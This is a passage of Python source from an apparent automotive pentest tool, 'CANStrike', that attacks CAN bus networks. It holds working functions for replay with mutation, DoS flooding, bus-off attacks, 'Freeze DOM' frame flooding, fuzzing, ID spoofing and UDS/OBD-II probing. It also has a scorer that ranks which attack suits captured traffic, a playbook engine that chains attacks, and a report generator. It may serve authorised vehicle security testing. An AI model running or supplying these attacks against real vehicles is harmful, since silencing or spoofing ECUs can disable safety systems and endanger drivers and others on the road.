            return (65,None,"Medium load ({:.0f}fps) — DoS feasible".format(rate))
        return (30,None,"HIGH load ({:.0f}fps) — bus already stressed".format(rate))

    def _score_busoff(self, frames):
        if not frames: return (10,None,"No frames")
        r = Counter(f["id"] for f in frames).most_common()[-1]
        return (75,"0x{:03X}".format(r[0]),
                "Node 0x{:03X} least active ({} frames) — Bus-Off target".format(*r))

    def _score_fuzzing(self, frames):
        u = len(set(f["id"] for f in frames))
        return (75,None,"{} unique IDs — good fuzzing surface".format(u)) if u>15 \
            else (50,None,"Only {} unique IDs — targeted fuzzing".format(u))

    def _score_freezedom(self, frames):
        if not frames: return (10,None,"No frames")
        per = {i:n for i,n in Counter(f["id"] for f in frames).items() if n>5}
        if per:
            t = max(per,key=per.get)
            return (80,"0x{:03X}".format(t),
                    "Node 0x{:03X} x{} — Freeze DOM will silence it".format(t,per[t]))
        return (45,None,"No high-frequency node")

    def _score_spoof(self, frames):
        ids = set(f["id"] for f in frames)
        if 0x7E0 in ids or 0x7E8 in ids:
            return (95,"0x7E0","OBD-II present — spoofing intercepts diagnostics!")
        if 0x700 in ids or 0x708 in ids:
            return (90,"0x700","UDS ECU detected — spoof for diagnostic replay!")
        if ids:
            t = list(ids)[0]
            return (65,"0x{:03X}".format(t),"Moderate spoof candidate")
        return (20,None,"No frames")

    def _score_uds(self, frames):
        ids = set(f["id"] for f in frames)
        if 0x7E0 in ids: return (90,"0x7E0","OBD-II present — UDS attacks viable!")
        if 0x700 in ids: return (85,"0x700","UDS ECU at 0x700 — scan DIDs, Security Access")
        return (30,None,"No UDS/OBD-II IDs found")

    def analyse(self, frames: List[Dict]) -> List[Dict]:
        scorers = [
            ("Replay Attack",  self._score_replay),
            ("DoS Flooding",   self._score_dos),
            ("Bus-Off",        self._score_busoff),
            ("Fuzzing",        self._score_fuzzing),
            ("Freeze DOM",     self._score_freezedom),
            ("ID Spoofing",    self._score_spoof),
            ("UDS Attacks",    self._score_uds),
        ]
        results = []
        for name, fn in scorers:
            score, target, reason = fn(frames)
            results.append({"attack":name,"score":score,"target":target,"reason":reason})
        results.sort(key=lambda x: x["score"], reverse=True)
        return results

    def print_report(self, results: List[Dict], console=None) -> str:
        print()
        print(c("=" * 68, CYAN))
        print(c("  AI ANALYST v2 — THINK 4 YOURSELF", BOLD + CYAN))
        print(c("=" * 68, CYAN))
        if RICH and console:
            tbl = Table(box=box.SIMPLE_HEAVY, border_style="cyan",
                        title="[bold cyan]Attack Effectiveness Rankings[/]",
                        show_lines=True)
            tbl.add_column("Rank",   width=5,  justify="center", style="dim")
            tbl.add_column("Attack", width=18, style="bold")
            tbl.add_column("Score",  width=8,  justify="center")
            tbl.add_column("Target", width=8)
            tbl.add_column("Verdict", width=44)
            for i, r in enumerate(results):
                sc  = r["score"]
                col = "green" if sc>=75 else "yellow" if sc>=50 else "red"
                bar = chr(0x2588)*(sc//10) + chr(0x2591)*(10-sc//10)
                tbl.add_row("#{}".format(i+1), r["attack"],
                            "[{}]{}[/]".format(col,sc), r["target"] or "—",
                            "[{}][{}][/] {}".format(col,bar,r["reason"]))
            console.print(tbl)
        else:
            print(c("  {:<6}{:<20}{:<10}{:<10}{}".format(
                "Rank","Attack","Score","Target","Verdict"), CYAN))
            print(c("  "+"-"*64, DIM))
            for i,r in enumerate(results):
                sc  = r["score"]
                col = GREEN if sc>=75 else YELLOW if sc>=50 else RED
                bar = chr(0x2588)*(sc//10)+chr(0x2591)*(10-sc//10)
                print("  {:<8}{:<20}{:<28}{:<12}{}".format(
                    "#{}".format(i+1), r["attack"],
                    c("{:d}% [{}]".format(sc,bar),col),
                    c(r["target"] or "—",CYAN),
                    c(r["reason"],DIM)))
        print()
        best = results[0]
        print(c("  BEST ATTACK : {}  ({:d}%)".format(best["attack"],best["score"]),
               BOLD+GREEN))
        if best["target"]:
            print(c("  Target ID   : {}".format(best["target"]), CYAN))
        print(c("  Why         : {}".format(best["reason"]), DIM))
        print()
        return best["attack"]

    def print_delta(self, deltas: List[Dict], console=None):
        print()
        print(c("  DELTA DIFF — Baseline vs Triggered", BOLD + YELLOW))
        print(c("  Packets that changed or appeared during the action:", DIM))
        print()
        if not deltas:
            pr("No differences found — action may not produce distinct CAN frames", YELLOW)
            return
        if RICH and console:
            tbl = Table(box=box.SIMPLE, border_style="yellow",
                        title="[yellow]Delta Candidates[/]")
            tbl.add_column("ID",     style="cyan",  width=8)
            tbl.add_column("Reason", style="bold",  width=12)
            tbl.add_column("Conf",   style="green", width=6, justify="center")
            tbl.add_column("Detail",               width=36)
            tbl.add_column("Sample Data",          width=22)
            for d in deltas:
                col = "green" if d["confidence"]>80 else "yellow"
                tbl.add_row(
                    d["id_hex"],
                    "[{}]{}[/]".format(col, d["reason"]),
                    "{}%".format(d["confidence"]),
                    d["detail"],
                    d["sample"].hex().upper() if d["sample"] else "—")
            console.print(tbl)
        else:
            print(c("  {:<10}{:<10}{:<6}{:<36}{}".format(
                "ID","Reason","Conf","Detail","Sample"), CYAN))
            print(c("  "+"-"*70, DIM))
            for d in deltas:
                col = GREEN if d["confidence"]>80 else YELLOW
                print("  {:<16}{:<14}{:<8}{:<36}{}".format(
                    c(d["id_hex"],CYAN),
                    c(d["reason"],col),
                    "{}%".format(d["confidence"]),
                    d["detail"],
                    d["sample"].hex().upper() if d["sample"] else "—"))


# ═══════════════════════════════════════════════════════════════════════════════
#  ATTACK ENGINE  — all attacks, backend-agnostic
# ═══════════════════════════════════════════════════════════════════════════════
class AttackEngine:

    def __init__(self, bus: BusInterface, console=None):
        self.bus = bus
        self.con = console

    # ── Baudrate detect ───────────────────────────────────────────────────────
    def detect_baudrate(self) -> Optional[int]:
        if isinstance(self.bus, VCanBackend):
            pr("vcan0 — virtual interface, no baudrate detection needed", YELLOW)
            return self.bus.bitrate
        pr("Baudrate detection — testing 1M/500K/250K/125K", CYAN)
        for rate in [1000000, 500000, 250000, 125000]:
            pr("  Testing {:d}K...".format(rate//1000), DIM)
            try:
                if isinstance(self.bus, CANPicoBackend):
                    self.bus._running = False; time.sleep(0.1)
                    self.bus._raw(b"C\r"); time.sleep(0.05)
                    self.bus._raw("{}\r".format(
                        CANPicoBackend.SLCAN_SPEEDS.get(rate,"S4")).encode())
                    time.sleep(0.05)
                    self.bus._raw(b"O\r"); time.sleep(0.1)
                    self.bus._start_rx()
                frames = self.bus.capture(1.2)
                if frames:
                    pr("Baudrate: {:d}K ({} frames)".format(rate//1000,len(frames)), GREEN)
                    return rate
            except Exception as e:
                log.warning("Baudrate {:d}: {}".format(rate,e))
        pr("Auto-detect failed", YELLOW); return None

    # ── Capture ───────────────────────────────────────────────────────────────
    def capture_packets(self, duration: float = 5.0, label: str = "") -> List[Dict]:
        pr("Capturing {:.1f}s {}...".format(duration,label), CYAN)
        frames = self.bus.capture(duration)
        pr("{} frames | {} unique IDs".format(
           len(frames), len(set(f["id"] for f in frames))), GREEN)
        return frames

    # ── Identify (3-run + data delta) ─────────────────────────────────────────
    def identify_packet(self, action: str = "action",
                        duration: float = 3.0, runs: int = 3) -> List[Dict]:
        all_runs: List[List[Dict]] = []
        pr("Packet ID — {:d} runs, data-delta mode".format(runs), YELLOW)
        for run_num in range(1, runs+1):
            print()
            print(c("  --- RUN {:d}/{:d} ---".format(run_num, runs), YELLOW))
            input(c("  Perform '{}' NOW then press ENTER...".format(action), BOLD+YELLOW))
            frames = self.capture_packets(duration, "(run {:d})".format(run_num))
            all_runs.append(frames); print(c("  {} frames".format(len(frames)), GREEN))

        # ID-level intersection
        id_sets  = [set(f["id"] for f in run) for run in all_runs]
        common   = set.intersection(*id_sets)
        candidates = []
        for cid in common:
            per_run  = [[f for f in run if f["id"]==cid] for run in all_runs]
            counts   = [len(r) for r in per_run]
            avg      = sum(counts)/len(counts)
            variance = sum((x-avg)**2 for x in counts)/len(counts)

            # DATA DELTA: check if payload varied across runs (sign of action-driven change)
            all_payloads = set()
            for run_frames in per_run:
                for f in run_frames:
                    all_payloads.add(f["data"])
            payload_variance = len(all_payloads) > 1  # payloads changed across runs

            # Higher confidence if payload changed AND count is consistent
            conf = max(10, min(99, int(100 - variance*2 - avg*0.3
                                      + (20 if payload_variance else 0))))
            sample = per_run[0][0]["data"] if per_run[0] else b""
            candidates.append({
                "id":          cid,
                "id_hex":      "0x{:03X}".format(cid),
                "counts":      counts,
                "avg":         round(avg,1),
                "confidence":  conf,
                "sample_data": sample.hex().upper() if sample else "",
                "payload_changed": payload_variance,
            })
        candidates.sort(key=lambda x: x["confidence"], reverse=True)
        print()
        if candidates:
            pr("{} candidate(s)".format(len(candidates)), GREEN)
            self._print_candidates(candidates)
        else:
            pr("No common packets — try longer capture or repeat faster", YELLOW)
        return candidates

    def _print_candidates(self, cands: List[Dict]):
        if RICH and self.con:
            tbl = Table(box=box.SIMPLE, border_style="yellow",
                        title="[yellow]Identified Candidates[/]")
            tbl.add_column("ID",        style="cyan",  width=8)
            tbl.add_column("Conf",      style="green", width=8, justify="center")
            tbl.add_column("Count/Run", style="dim",   width=12)
            tbl.add_column("Payload Δ", width=10, justify="center")
            tbl.add_column("Sample",    width=24)
            for cd in cands:
                bar = chr(0x2588)*(cd["confidence"]//10)
                chg = "[green]YES[/]" if cd["payload_changed"] else "[dim]no[/]"
                tbl.add_row(cd["id_hex"],
                            "{}% {}".format(cd["confidence"],bar),
                            str(cd["counts"]), chg, cd["sample_data"])
            self.con.print(tbl)
        else:
            print(c("  {:<10}{:<14}{:<14}{:<12}{}".format(
                "ID","Conf","Count/Run","Payload Δ","Sample"), CYAN))
            print(c("  "+"-"*62, DIM))
            for cd in cands:
                col = GREEN if cd["confidence"]>70 else YELLOW
                bar = chr(0x2588)*(cd["confidence"]//10)
                chg = c("YES",GREEN) if cd["payload_changed"] else c("no",DIM)
                print("  {:<16}{:<26}{:<16}{:<14}{}".format(
                    c(cd["id_hex"],CYAN),
                    c("{}% {}".format(cd["confidence"],bar),col),
                    str(cd["counts"]), chg, cd["sample_data"]))

    # ── Replay + Mutation ─────────────────────────────────────────────────────
    def replay_attack(self, arb_id: int, data: bytes, count: int = 20,
                      delay_ms: float = 100.0, mutate: str = "none"):
        """
        mutate options:
          'none'     — exact replay
          'bitflip'  — flip random bits each frame
          'step'     — increment last byte each frame
          'boundary' — cycle through 0x00,0x7F,0x80,0xFF in last byte
        """
        pr("Replay 0x{:03X} [{}] x{} mutate={}".format(
           arb_id,data.hex().upper(),count,mutate), ORG)
        boundaries = [0x00, 0x7F, 0x80, 0xFF]
        for i in range(count):
            payload = bytearray(data)
            if mutate == "bitflip":
                idx = random.randint(0, len(payload)-1)
                payload[idx] ^= (1 << random.randint(0,7))
            elif mutate == "step":
                payload[-1] = (i) % 256
            elif mutate == "boundary":
                payload[-1] = boundaries[i % len(boundaries)]

            ok  = self.bus.send_frame(arb_id, bytes(payload))
            sym = c("OK",GREEN) if ok else c("FAIL",RED)
            print("\r  [{}] {:d}/{:d}  {}".format(
                sym,i+1,count,bytes(payload).hex().upper()),
                end="", flush=True)
            time.sleep(delay_ms/1000)
        print()
        pr("Replay done — {:d} frames".format(count), GREEN)

    # ── DoS Flooding (with throughput feedback) ────────────────────────────────
    def dos_attack(self, rate_fps: int = 2000, duration_s: float = 10.0,
                   target_id: Optional[int] = None):
        pr("DoS {:d}fps for {:.1f}s{}".format(
           rate_fps, duration_s,
           " → 0x{:03X}".format(target_id) if target_id is not None else ""), RED)
        delay    = 1.0 / max(1, rate_fps)
        stop     = time.time() + duration_s
        sent     = 0
        t_last   = time.time()
        achieved = 0.0
        try:
            while time.time() < stop:
                fid  = target_id if target_id is not None else random.randint(0,0x7FF)
                data = bytes(random.randint(0,255) for _ in range(8))
                self.bus.send_frame(fid, data)
                sent += 1
                now = time.time()
                if now - t_last >= 1.0:
                    achieved = sent / max(0.001, now - (stop - duration_s))
                    t_last = now
                if sent % 200 == 0:
                    print("\r  Sent:{}  Achieved:{:.0f}fps  Left:{:.1f}s".format(
                        c(str(sent),RED), achieved, max(0,stop-time.time())),
                        end="", flush=True)
                time.sleep(delay)
        except KeyboardInterrupt: pass
        print()
        pr("DoS stopped — {} frames @ ~{:.0f}fps".format(sent,achieved), YELLOW)

    # ── Freeze DOM ────────────────────────────────────────────────────────────
    def freeze_dom(self, target_id: int, duration_s: float = 10.0):
        pr("Freeze DOM 0x{:03X} for {:.1f}s".format(target_id,duration_s), MAG)
        payload = bytes([0xFF]*8)
        stop    = time.time()+duration_s; sent = 0
        try:
            while time.time() < stop:
                self.bus.send_frame(target_id, payload); sent += 1
                if sent%200==0:
                    print("\r  Frames:{}".format(c(str(sent),MAG)),
                          end="", flush=True)
                time.sleep(0.0005)
        except KeyboardInterrupt: pass
        print()
        pr("Freeze DOM stopped — {:d} frames".format(sent), GREEN)

    # ── Bus-Off ───────────────────────────────────────────────────────────────
    def busoff_attack(self, target_id: int, cycles: int = 32):
        pr("Bus-Off 0x{:03X}  TEC+8 per cycle".format(target_id), RED)
        tec = 0
        for _ in range(1, cycles+1):
            self.bus.send_frame(target_id, bytes(8)); tec += 8; time.sleep(0.05)
            state = (c("ACTIVE",GREEN) if tec<128
                     else c("ERROR PASSIVE",YELLOW) if tec<256
                     else c("BUS-OFF",RED))
            print("\r  TEC:{} State:{}".format(c(str(tec),YELLOW),state),
                  end="", flush=True)
            if tec >= 256: break
        print()
        if tec >= 256:
            pr("Node 0x{:03X} → BUS-OFF (TEC={})".format(target_id,tec), RED)
        else:
            pr("ERROR PASSIVE (TEC={}) — increase cycles".format(tec), YELLOW)

    # ── Smart Fuzzer ──────────────────────────────────────────────────────────
    def fuzzing_attack(self, id_range: Tuple[int,int] = (0,0x7FF),
                       duration_s: float = 30.0, strategy: str = "random",
                       seed_frames: Optional[List[Dict]] = None):
        """
        Strategies:
          'random'    — pure random ID + data
          'bitflip'   — mutate seed frames bit by bit
          'boundary'  — boundary values (0x00,0x7F,0x80,0xFF) in each byte
          'increment' — step through each byte position 0→0xFF
        """
        pr("Fuzzing  0x{:03X}-0x{:03X}  {:.1f}s  strategy={}".format(
           id_range[0],id_range[1],duration_s,strategy), ORG)
        sent = 0; resps = 0; stop = time.time()+duration_s
        seeds = seed_frames or []
        boundaries = [0x00, 0x7F, 0x80, 0xFF]

        def next_frame() -> Tuple[int, bytes]:
            if strategy == "bitflip" and seeds:
                base = random.choice(seeds)
                payload = bytearray(base["data"])
                idx = random.randint(0, len(payload)-1)
                payload[idx] ^= (1 << random.randint(0,7))
                return base["id"], bytes(payload)
            elif strategy == "boundary" and seeds:
                base = random.choice(seeds)
                payload = bytearray(base["data"])
                for i in range(len(payload)):
                    payload[i] = random.choice(boundaries)
                return base["id"], bytes(payload)
            elif strategy == "increment" and seeds:
                base = random.choice(seeds)
                payload = bytearray(base["data"])
                idx = (sent//256) % len(payload)
                payload[idx] = sent % 256
                return base["id"], bytes(payload)
            else:  # random
                fid = random.randint(*id_range)
                return fid, bytes(random.randint(0,255) for _ in range(random.randint(1,8)))

        try:
            while time.time() < stop:
                fid, data = next_frame()
                self.bus.send_frame(fid, data); sent += 1
                rx = self.bus.flush_rx()
                if rx:
                    resps += len(rx)
                    for f in rx[:1]:
                        print("\n  RESPONSE 0x{:03X}: {}".format(
                            f["id"], f["data"].hex().upper()))
                if sent % 200 == 0:
                    print("\r  Sent:{}  Responses:{}  Left:{:.1f}s".format(
                        c(str(sent),ORG),c(str(resps),YELLOW),
                        max(0,stop-time.time())), end="", flush=True)
                time.sleep(0.001)
        except KeyboardInterrupt: pass
        print()
        pr("Fuzzing done — {} sent, {} responses".format(sent,resps), GREEN)

    # ── ID Spoofing ───────────────────────────────────────────────────────────
    def spoof_attack(self, spoof_id: int, payload: bytes,
                     count: int = 50, delay_ms: float = 50.0):
        pr("Spoofing as 0x{:03X} payload:{}".format(
           spoof_id,payload.hex().upper()), MAG)
        for i in range(count):
            self.bus.send_frame(spoof_id, payload)
            print("\r  Injected {:d}/{:d}".format(i+1,count), end="", flush=True)
            time.sleep(delay_ms/1000)
        print()
        pr("Spoof done — {:d} frames".format(count), GREEN)


# ═══════════════════════════════════════════════════════════════════════════════
#  REPORTER  — CSV, JSON, and HTML pentest report
# ═══════════════════════════════════════════════════════════════════════════════
class Reporter:

    @staticmethod
    def export_csv(frames: List[Dict], filename: str):
        with open(filename, "w", newline="") as fh:
            w = csv.DictWriter(fh, fieldnames=["timestamp","id","dlc","data","extended"])
            w.writeheader()
            for f in frames:
                w.writerow({"timestamp":f["ts"],
                             "id":"0x{:03X}".format(f["id"]),
                             "dlc":f["dlc"],
                             "data":f["data"].hex().upper(),
                             "extended":f["extended"]})
        pr("CSV → {}".format(filename), GREEN)

    @staticmethod
    def export_json(frames: List[Dict], filename: str):
        rows = [{"ts":f["ts"],"id":"0x{:03X}".format(f["id"]),
                 "dlc":f["dlc"],"data":f["data"].hex().upper()} for f in frames]
        with open(filename,"w") as fh: json.dump(rows,fh,indent=2)
        pr("JSON → {}".format(filename), GREEN)

    @staticmethod
    def generate_html_report(data: Dict, filename: str):
        """
        Generate a structured HTML pentest report.
        data dict keys:
          title, tester, target, date, backend,
          frames (List[Dict]), analyst_results (List[Dict]),
          delta_results (List[Dict]), attacks_run (List[Dict]),
          uds_findings (List[Dict]), notes (str)
        """
        frames         = data.get("frames", [])
        analyst        = data.get("analyst_results", [])
        deltas         = data.get("delta_results", [])
        attacks        = data.get("attacks_run", [])
        uds_findings   = data.get("uds_findings", [])

        # Unique IDs summary
        uid_map: Dict[int,Dict] = {}
        for f in frames:
            fid = f["id"]
            if fid not in uid_map:
                uid_map[fid] = {"id":fid,"count":0,"data":b""}
            uid_map[fid]["count"] += 1
            uid_map[fid]["data"]   = f["data"]

        def severity_badge(score: int) -> str:
            if score >= 80: return '<span class="badge crit">CRITICAL</span>'
            if score >= 65: return '<span class="badge high">HIGH</span>'
            if score >= 50: return '<span class="badge med">MEDIUM</span>'
            return '<span class="badge low">LOW</span>'

        uid_rows = "".join(
            "<tr><td>0x{:03X}</td><td>{}</td><td>{}</td></tr>".format(
                v["id"], v["count"],
                v["data"].hex().upper() if isinstance(v["data"],bytes) else str(v["data"]))
            for v in sorted(uid_map.values(), key=lambda x: x["count"], reverse=True)[:50])

        analyst_rows = "".join(
            "<tr>{}<td>{}</td><td>{}</td><td>{}</td></tr>".format(
                severity_badge(r["score"]),
                r["attack"], r.get("target") or "—", r["reason"])
            for r in analyst) if analyst else "<tr><td colspan=4>No analysis run</td></tr>"

        delta_rows = "".join(
            "<tr><td>0x{:03X}</td><td><b>{}</b></td><td>{}%</td><td>{}</td><td>{}</td></tr>".format(
                d["id"], d["reason"], d["confidence"], d["detail"],
                d["sample"].hex().upper() if d.get("sample") else "—")
            for d in deltas) if deltas else "<tr><td colspan=5>No delta analysis run</td></tr>"

        attack_rows = "".join(
            "<tr><td>{}</td><td>{}</td><td>{}</td><td>{}</td></tr>".format(
                a.get("name","—"), a.get("target","—"),
                a.get("result","—"), a.get("ts","—"))
            for a in attacks) if attacks else "<tr><td colspan=4>No attacks recorded</td></tr>"

        uds_rows = "".join(
            "<tr><td>{}</td><td>{}</td><td>{}</td></tr>".format(
                u.get("service","—"), u.get("detail","—"), u.get("result","—"))
            for u in uds_findings) if uds_findings else "<tr><td colspan=3>No UDS findings</td></tr>"

        html = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>{title} — CANStrike Report</title>
<style>
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{font-family:'Segoe UI',sans-serif;background:#0d1117;color:#c9d1d9;line-height:1.6}}
  .header{{background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
           padding:40px;border-bottom:2px solid #00ff9c}}
  .header h1{{color:#00ff9c;font-size:2em;letter-spacing:3px}}
  .header p{{color:#8b949e;margin-top:8px}}
  .meta-grid{{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;
              padding:24px;background:#161b22;border-bottom:1px solid #21262d}}
  .meta-card{{background:#0d1117;border:1px solid #30363d;border-radius:8px;
              padding:16px;text-align:center}}
  .meta-card .val{{font-size:1.4em;font-weight:700;color:#00ff9c}}
  .meta-card .lbl{{font-size:0.8em;color:#8b949e;margin-top:4px;letter-spacing:1px}}
  .section{{padding:24px}}
  .section h2{{color:#00ff9c;border-bottom:1px solid #21262d;
               padding-bottom:8px;margin-bottom:16px;letter-spacing:2px}}
  .section h3{{color:#58a6ff;margin:16px 0 8px;font-size:0.95em;letter-spacing:1px}}
  table{{width:100%;border-collapse:collapse;font-size:0.88em;margin-bottom:16px}}
  th{{background:#161b22;color:#8b949e;padding:10px 12px;text-align:left;
      border:1px solid #21262d;letter-spacing:1px;font-size:0.82em}}
  td{{padding:8px 12px;border:1px solid #21262d;font-family:'Courier New',monospace}}
  tr:hover td{{background:#161b22}}
  .badge{{display:inline-block;padding:2px 8px;border-radius:4px;
          font-size:0.75em;font-weight:700;letter-spacing:1px}}
  .badge.crit{{background:#ff000033;color:#ff4444;border:1px solid #ff4444}}
  .badge.high{{background:#ff6b3533;color:#ff6b35;border:1px solid #ff6b35}}
  .badge.med{{background:#ffd70033;color:#ffd700;border:1px solid #ffd700}}
  .badge.low{{background:#00ff9c22;color:#00ff9c;border:1px solid #00ff9c}}
  .notes{{background:#0f2a1a;border:1px solid #00ff9c33;border-radius:8px;
          padding:16px;white-space:pre-wrap;font-family:'Courier New',monospace;
          font-size:0.85em;color:#c9d1d9}}
  .footer{{text-align:center;padding:24px;color:#30363d;font-size:0.8em;
           border-top:1px solid #21262d}}
</style>
</head>
<body>
<div class="header">
  <h1>⚡ CANSTRIKE PENTEST REPORT</h1>
  <p>{title}</p>
</div>
<div class="meta-grid">
  <div class="meta-card"><div class="val">{tester}</div><div class="lbl">TESTER</div></div>
  <div class="meta-card"><div class="val">{target}</div><div class="lbl">TARGET</div></div>
  <div class="meta-card"><div class="val">{date}</div><div class="lbl">DATE</div></div>
  <div class="meta-card"><div class="val">{backend}</div><div class="lbl">BACKEND</div></div>
</div>
<div class="meta-grid" style="grid-template-columns:repeat(3,1fr)">
  <div class="meta-card"><div class="val" style="color:#58a6ff">{total_frames}</div>
    <div class="lbl">FRAMES CAPTURED</div></div>
  <div class="meta-card"><div class="val" style="color:#ffd700">{unique_ids}</div>
    <div class="lbl">UNIQUE IDs</div></div>
  <div class="meta-card"><div class="val" style="color:#ff6b35">{attacks_count}</div>
    <div class="lbl">ATTACKS RUN</div></div>
</div>

<div class="section">
  <h2>📡 CAPTURED TRAFFIC — TOP 50 IDs</h2>
  <table><tr><th>CAN ID</th><th>Frame Count</th><th>Last Data</th></tr>
  {uid_rows}</table>
</div>

<div class="section">
  <h2>🤖 AI ANALYST RESULTS</h2>
  <table><tr><th>Severity</th><th>Attack Vector</th><th>Target ID</th><th>Assessment</th></tr>
  {analyst_rows}</table>
</div>

<div class="section">
  <h2>🔍 DELTA DIFF — BASELINE vs TRIGGERED</h2>
  <table><tr><th>ID</th><th>Change Type</th><th>Confidence</th>
              <th>Detail</th><th>Sample Data</th></tr>
  {delta_rows}</table>
</div>

<div class="section">
  <h2>⚔️ ATTACKS EXECUTED</h2>
  <table><tr><th>Attack</th><th>Target</th><th>Result</th><th>Timestamp</th></tr>
  {attack_rows}</table>
</div>

<div class="section">
  <h2>🔧 UDS / OBD-II FINDINGS</h2>
  <table><tr><th>Service</th><th>Detail</th><th>Result</th></tr>
  {uds_rows}</table>
</div>

<div class="section">
  <h2>📝 TESTER NOTES</h2>
  <div class="notes">{notes}</div>
</div>

<div class="footer">
  Generated by CANStrike v4.0 — {generated_at}<br>
  FOR AUTHORIZED SECURITY RESEARCH ONLY
</div>
</body>
</html>""".format(
            title=data.get("title","CAN Bus Assessment"),
            tester=data.get("tester","—"),
            target=data.get("target","—"),
            date=data.get("date",datetime.now().strftime("%Y-%m-%d")),
            backend=data.get("backend","—"),
            total_frames=len(frames),
            unique_ids=len(uid_map),
            attacks_count=len(attacks),
            uid_rows=uid_rows,
            analyst_rows=analyst_rows,
            delta_rows=delta_rows,
            attack_rows=attack_rows,
            uds_rows=uds_rows,
            notes=data.get("notes","No notes."),
            generated_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )
        with open(filename,"w") as fh: fh.write(html)
        pr("HTML Report → {}".format(filename), GREEN)
        pr("Open in browser: firefox {}".format(filename), DIM)

    @staticmethod
    def print_table(frames: List[Dict], limit: int = 40, console=None):
        if not frames: pr("No frames", YELLOW); return
        uniq: Dict[int,Dict] = {}
        for f in frames:
            if f["id"] not in uniq: uniq[f["id"]] = {**f,"count":1}
            else: uniq[f["id"]]["count"] += 1
        rows = list(uniq.values())[:limit]
        if RICH and console:
            tbl = Table(box=box.SIMPLE_HEAVY, border_style="cyan",
                        title="[cyan]Capture — {:d} unique IDs[/]".format(len(uniq)))
            tbl.add_column("ID",    style="cyan",   width=8)
            tbl.add_column("DLC",   style="dim",    width=5, justify="center")
            tbl.add_column("Data",                  width=26)
            tbl.add_column("Count", style="yellow", width=8, justify="right")
            for v in rows:
                d = v["data"].hex().upper() if isinstance(v["data"],bytes) else str(v["data"])
                tbl.add_row("0x{:03X}".format(v["id"]),str(v["dlc"]),d,str(v["count"]))
            console.print(tbl)
        else:
            print(c("\n  {:<12}{:<6}{:<26}{}".format("ID","DLC","Data","Count"), CYAN))
            print(c("  "+"-"*52, DIM))
            for v in rows:
                d    = v["data"].hex().upper() if isinstance(v["data"],bytes) else str(v["data"])
                id_s = c("0x{:03X}".format(v["id"]),CYAN)
                cnt  = c(str(v["count"]),YELLOW)
                print("  {:<18}{:<6}{:<26}{}".format(id_s,str(v["dlc"]),d,cnt))


# ═══════════════════════════════════════════════════════════════════════════════
#  SCRIPTING ENGINE  — automated attack-chain playbooks
# ═══════════════════════════════════════════════════════════════════════════════
class ScriptEngine:
    """
    Runs a JSON playbook file of sequential attack steps.

    Playbook format:
    {
      "name": "My Test",
      "steps": [
        {"cmd":"capture",  "duration":5},
        {"cmd":"analyse"},
        {"cmd":"replay",   "id":"0x100","data":"FF00FF00","count":10,"delay_ms":100},
        {"cmd":"dos",      "fps":1000,"duration":5},
        {"cmd":"busoff",   "id":"0x200","cycles":20},
        {"cmd":"freeze",   "id":"0x300","duration":5},
        {"cmd":"fuzz",     "id_min":"0x000","id_max":"0x7FF","duration":10},
        {"cmd":"spoof",    "id":"0x7E0","data":"0201030000000000","count":20},
        {"cmd":"uds_session", "mode":3},
        {"cmd":"uds_read_did","did":"0xF190"},
        {"cmd":"uds_dtcs"},
        {"cmd":"sleep",    "seconds":2},
        {"cmd":"export_html","filename":"report.html","title":"Auto Scan"}
      ]
    }
    """

    def __init__(self, engine: AttackEngine, analyst: Analyst,
                 uds: Optional[UDSClient], captures: List[Dict],
                 attacks_log: List[Dict], console=None):
        self.engine      = engine
        self.analyst     = analyst
        self.uds         = uds
        self.captures    = captures
        self.attacks_log = attacks_log
        self.con         = console

    def run_file(self, path: str) -> List[Dict]:
        with open(path) as fh:
            pb = json.load(fh)
        pr("Playbook: {}  ({} steps)".format(pb.get("name","?"), len(pb["steps"])), CYAN)
        for i, step in enumerate(pb["steps"]):
            cmd = step.get("cmd","")
            pr("Step {:d}/{:d}: {}".format(i+1,len(pb["steps"]),cmd), YELLOW)
            self._run_step(step)
        pr("Playbook complete", GREEN)
        return self.captures

    def _run_step(self, step: Dict):
        cmd = step.get("cmd","")
        try:
            if cmd == "capture":
                dur = float(step.get("duration", 5))
                self.captures.extend(self.engine.capture_packets(dur))
            elif cmd == "analyse":
                if self.captures:
                    results = self.analyst.analyse(self.captures)
                    self.analyst.print_report(results, self.con)
            elif cmd == "replay":
                self.engine.replay_attack(
                    int(step["id"],16), bytes.fromhex(step["data"]),
                    int(step.get("count",10)), float(step.get("delay_ms",100)),
                    step.get("mutate","none"))
                self.attacks_log.append({"name":"Replay","target":step["id"],
                                         "result":"Executed","ts":ts()})
            elif cmd == "dos":
                tid = int(step["id"],16) if "id" in step else None
                self.engine.dos_attack(int(step.get("fps",1000)),
                                       float(step.get("duration",5)), tid)
                self.attacks_log.append({"name":"DoS","target":step.get("id","random"),
                                         "result":"Executed","ts":ts()})
            elif cmd == "busoff":
                self.engine.busoff_attack(int(step["id"],16),int(step.get("cycles",32)))
                self.attacks_log.append({"name":"Bus-Off","target":step["id"],
                                         "result":"Executed","ts":ts()})
            elif cmd == "freeze":
                self.engine.freeze_dom(int(step["id"],16),float(step.get("duration",5)))
                self.attacks_log.append({"name":"FreezDOM","target":step["id"],
                                         "result":"Executed","ts":ts()})
            elif cmd == "fuzz":
                lo = int(step.get("id_min","0x000"),16)
                hi = int(step.get("id_max","0x7FF"),16)
                self.engine.fuzzing_attack((lo,hi),float(step.get("duration",10)),
                                           step.get("strategy","random"), self.captures)
                self.attacks_log.append({"name":"Fuzzing","target":"{}-{}".format(
                    step.get("id_min"),step.get("id_max")),"result":"Executed","ts":ts()})
            elif cmd == "spoof":
                self.engine.spoof_attack(int(step["id"],16),
                                         bytes.fromhex(step["data"]),
                                         int(step.get("count",20)))
                self.attacks_log.append({"name":"Spoof","target":step["id"],
                                         "result":"Executed","ts":ts()})
            elif cmd == "uds_session" and self.uds:
                r = self.uds.uds_session(int(step.get("mode","3"),16)
                                         if isinstance(step.get("mode"),str)
                                         else step.get("mode",3))
                pr("UDS session: {}".format(r), GREEN if r["ok"] else RED)
            elif cmd == "uds_read_did" and self.uds:
                did = int(step["did"],16) if isinstance(step["did"],str) else step["did"]
                r   = self.uds.uds_read_did(did)
                pr("DID 0x{:04X}: {}".format(did,
                   r.get("data",b"").hex().upper() if r["ok"] else r.get("nrc_str")),
                   GREEN if r["ok"] else RED)
            elif cmd == "uds_dtcs" and self.uds:
                dtcs = self.uds.obd_read_dtcs()
